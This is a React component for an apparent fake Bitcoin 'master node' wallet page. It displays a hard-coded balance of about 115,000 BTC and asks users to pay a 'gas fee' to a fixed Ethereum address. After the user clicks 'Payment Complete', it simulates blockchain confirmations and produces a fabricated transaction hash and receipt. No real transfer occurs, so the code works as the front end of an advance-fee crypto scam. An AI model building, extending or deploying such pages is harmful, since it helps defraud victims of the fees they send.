import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import axios from 'axios';
import logo from '/Users/mac/Desktop/walletbtc/rkbtcconnect/src/assets/bitcoin.png';

const WalletPage = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [balance] = useState({ btc: 114973.0000 });
  const [btcPrice] = useState(87506);
  const [transferData, setTransferData] = useState({
    toAddress: '',
    amount: '',
  });
  const [showGasFees, setShowGasFees] = useState(false);
  const [showQRCode, setShowQRCode] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [confirmationCount, setConfirmationCount] = useState(0);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [gasFees, setGasFees] = useState({
    eth: '0.000',
    bnb: '0.000',
    usdt: '0.00',
    usd: '$0.00'
  });
  const [timeRemaining, setTimeRemaining] = useState(450); // 450 minutes
  const [showReceipt, setShowReceipt] = useState(false);
  const [transactionDetails, setTransactionDetails] = useState({
    txId: '',
    timestamp: '',
    fee: '',
    newBalance: 0
  });

  const calculateGasFees = (amount) => {
    // This is a mock calculation for demonstration
    const baseRate = parseFloat(amount) || 0;
    return {
      eth: (baseRate * 0.00015).toFixed(6) + ' ETH',
      bnb: (baseRate * 0.0005).toFixed(6) + ' BNB',
      usdt: (baseRate * 0.25).toFixed(2) + ' USDT',
      usd: '$' + (baseRate * 0.25).toFixed(2)
    };
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setTransferData({
      ...transferData,
      [name]: value
    });
    setError('');
    setShowGasFees(false);
    setShowQRCode(false);
    setShowConfirmation(false);

    if (name === 'toAddress') {
      if (value.startsWith('0x') || value.startsWith('T')) {
        setError('Cannot Process because no bridge found');
        setShowGasFees(false);
      } else if (value.startsWith('1') || value.startsWith('3') || value.startsWith('bc1')) {
        setShowGasFees(true);
        setGasFees(calculateGasFees(transferData.amount));
      }
    }

    if (name === 'amount' && transferData.toAddress.match(/^(1|3|bc1)/)) {
      setGasFees(calculateGasFees(value));
    }
  };

  const handleProceed = () => {
    if (!transferData.amount || !transferData.toAddress) {
      setError('Please enter both address and amount');
      return;
    }
    setShowQRCode(true);
    setShowGasFees(false);
  };

  const handlePaymentComplete = () => {
    setShowQRCode(false);
    setShowConfirmation(true);
    simulateConfirmations();
  };

  const formatTime = (minutes) => {
    const hours = Math.floor(minutes / 60);
    const mins = minutes % 60;
    return `${hours}h ${mins}m`;
  };

  const simulateConfirmations = () => {
    let count = 0;
    const confirmationInterval = setInterval(() => {
      count++;
      setConfirmationCount(count);
      
      if (count >= 18) {
        clearInterval(confirmationInterval);
        const txId = '0x' + Array(64).fill(0).map(() => 
          Math.floor(Math.random() * 16).toString(16)
        ).join('');
        
        setTransactionDetails({
          txId,
          timestamp: new Date().toLocaleString(),
          fee: gasFees.eth,
          newBalance: balance.btc - parseFloat(transferData.amount)
        });
        
        setSuccess('Transaction completed successfully!');
        setShowConfirmation(false);
        setShowReceipt(true);
      }
    }, 1000); // Changed from 1500000 (25 minutes) to 1000 (1 second) for testing

    // Countdown timer
    const timerInterval = setInterval(() => {
      setTimeRemaining(prev => {
        if (prev <= 0) {
          clearInterval(timerInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000); // Changed from 60000 (1 minute) to 1000 (1 second) for testing

    return () => {
      clearInterval(confirmationInterval);
      clearInterval(timerInterval);
    };
  };

  return (
    <div className="App">
      <nav className="App-nav">
        <div className="nav-left">
          <img src={logo} className="App-logo" alt="logo" />
          <h2 className="wallet-title">RK BTC Master Node Wallet</h2>
        </div>
        <div className="nav-right">
          <button className="nav-btn" onClick={() => navigate('/')}>Home</button>
          <button className="nav-btn" onClick={() => navigate('/wallet')}>Wallet</button>
          <button className="nav-btn" onClick={() => navigate('/admin')}>Admin</button>
        </div>
      </nav>
      
      <main className="App-main">
        <div className="wallet-container">
          <div className="balance-section orange-container">
            <h2>Wallet Balance</h2>
            <div className="balance-display">
              <p className="btc-balance">{balance.btc.toFixed(4)} BTC</p>
              <p className="btc-price white-text">Current BTC Price: ${btcPrice.toLocaleString()}</p>
              <p className="usd-balance">≈ ${(balance.btc * btcPrice).toLocaleString()}</p>
            </div>
          </div>

          <div className="transfer-section">
            <h3>Transfer BTC</h3>
            {error && <div className="error-message">{error}</div>}
            {success && <div className="success-message">{success}</div>}
            
            <form onSubmit={(e) => e.preventDefault()} className="transfer-form">
              <div className="form-group">
                <label>Recipient Address</label>
                <input
                  type="text"
                  name="toAddress"
                  value={transferData.toAddress}
                  onChange={handleInputChange}
                  placeholder="Enter Bitcoin address (starting with 1, 3, or bc1)"
                  className={error ? 'error-input' : ''}
                  required
                />
                <small className="address-hint">
                  Valid formats: 1xxx... , 3xxx... , bc1xxx...
                </small>
              </div>

              <div className="form-group">
                <label>Amount (BTC)</label>
                <input
                  type="number"
                  name="amount"
                  value={transferData.amount}
                  onChange={handleInputChange}
                  placeholder="0.00000000"
                  step="0.00000001"
                  min="0"
                  required
                  className="black-text"
                />
              </div>

              {(transferData.amount > 0 && transferData.toAddress.match(/^(1|3|bc1)/)) && (
                <div className="gas-fees-container">
                  <h4 className="black-text">Real-Time Gas Fee Calculation</h4>
                  <div className="gas-fees-grid">
                    <div className="gas-fee-item">
                      <span className="fee-label black-text">ETH Fee:</span>
                      <span className="fee-value black-text">{gasFees.eth}</span>
                    </div>
                    <div className="gas-fee-item">
                      <span className="fee-label black-text">BNB Fee:</span>
                      <span className="fee-value black-text">{gasFees.bnb}</span>
                    </div>
                    <div className="gas-fee-item">
                      <span className="fee-label black-text">USDT Fee:</span>
                      <span className="fee-value black-text">{gasFees.usdt}</span>
                    </div>
                    <div className="gas-fee-item">
                      <span className="fee-label black-text">USD Fee:</span>
                      <span className="fee-value black-text">{gasFees.usd}</span>
                    </div>
                  </div>
                  <button className="proceed-btn" onClick={handleProceed}>
                    Pay Gas Fee to complete Transaction
                  </button>
                </div>
              )}

              {showQRCode && (
                <div className="qr-payment-container">
                  <h4>Gas Fee Payment</h4>
                  <p className="master-node-address">
                    Master Node Address: 0x3aDF0d605F72dC1F332eD15D76B61Ae0b6fe7c7d
                  </p>
                  <button className="payment-complete-btn" onClick={handlePaymentComplete}>
                    Payment Complete
                  </button>
                </div>
              )}

              {showConfirmation && (
                <div className="confirmation-container">
                  <h4>Transaction in Progress</h4>
                  <p>Confirmations: {confirmationCount}/18</p>
                  <div className="progress-bar">
                    <div 
                      className="progress-fill" 
                      style={{ width: `${(confirmationCount/18) * 100}%` }}
                    ></div>
                  </div>
                  <p className="confirmation-info">
                    Time remaining: {formatTime(timeRemaining)}
                  </p>
                  <div className="confirmation-details">
                    <p>Processing block height: {8976543 + confirmationCount}</p>
                    <p>Network status: Active</p>
                  </div>
                </div>
              )}

              {showReceipt && (
                <div className="transaction-receipt">
                  <h4>Transaction Receipt</h4>
                  <div className="receipt-content">
                    <div className="receipt-header">
                      <img src={logo} alt="BTC Logo" className="receipt-logo" />
                      <p className="receipt-timestamp">{transactionDetails.timestamp}</p>
                    </div>
                    
                    <div className="receipt-details">
                      <div className="receipt-row">
                        <span>Transaction Hash</span>
                        <span className="hash">{transactionDetails.txId}</span>
                      </div>
                      
                      <div className="receipt-row">
                        <span>From</span>
                        <span>Your Wallet</span>
                      </div>
                      
                      <div className="receipt-row">
                        <span>To</span>
                        <span>{transferData.toAddress}</span>
                      </div>
                      
                      <div className="receipt-row">
                        <span>Amount</span>
                        <span>{transferData.amount} BTC</span>
                      </div>
                      
                      <div className="receipt-row">
                        <span>Gas Fee</span>
                        <span>{transactionDetails.fee}</span>
                      </div>
                      
                      <div className="receipt-row">
                        <span>Status</span>
                        <span className="success-status">Confirmed</span>
                      </div>
                      
                      <div className="receipt-row">
                        <span>Block Confirmations</span>
                        <span>18</span>
                      </div>
                    </div>

                    <div className="new-balance-section">
                      <h5>Updated Wallet Balance</h5>
                      <p className="new-balance">{transactionDetails.newBalance.toFixed(4)} BTC</p>
                      <p className="new-balance-usd">
                        ≈ ${(transactionDetails.newBalance * btcPrice).toLocaleString()}
                      </p>
                    </div>

                    <button 
                      className="close-receipt-btn"
                      onClick={() => {
                        setShowReceipt(false);
                        setTransferData({ toAddress: '', amount: '' });
                      }}
                    >
                      Close Receipt
                    </button>
                  </div>
                </div>
              )}
            </form>
          </div>
        </div>
      </main>
    </div>
  );
};

export default WalletPage; 